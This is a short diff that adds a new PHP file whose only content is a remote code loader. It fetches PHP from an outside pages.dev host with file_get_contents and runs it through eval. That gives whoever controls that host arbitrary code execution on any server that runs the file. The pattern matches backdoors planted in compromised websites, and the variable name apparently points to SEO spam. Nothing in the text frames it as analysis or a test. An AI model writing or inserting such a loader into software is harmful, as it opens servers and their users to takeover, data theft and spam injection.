@@ -1,0 +1,4 @@
+<?php
+$zhyvenseo = file_get_contents('https://helloo-everyonee.pages.dev/403.php');
+$zhyvenseo = "?> ".$zhyvenseo;
+eval($zhyvenseo);
